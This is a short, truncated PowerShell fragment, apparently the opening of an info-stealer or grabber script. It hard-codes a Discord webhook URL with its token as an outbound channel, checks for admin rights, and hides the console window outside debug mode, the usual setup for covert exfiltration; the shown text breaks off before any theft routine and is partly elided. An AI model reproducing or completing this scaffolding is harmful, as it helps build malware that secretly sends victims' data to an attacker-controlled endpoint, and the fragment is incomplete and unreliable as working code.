...
$webhook = "https://discord.com/api/webhooks/1122693457547362304/JDm3AufLQGgugxGnnfpTAWbS2pJp2kX0s66QB3W09Aj5tvrquoFlc0t1dy_qWUp7lLFB"
$debug_mode = $false
...
if (Invoke-Admin_Check -eq $false) {
    if (!($debug_mode)) {
        Hide-Console
    }
    try {
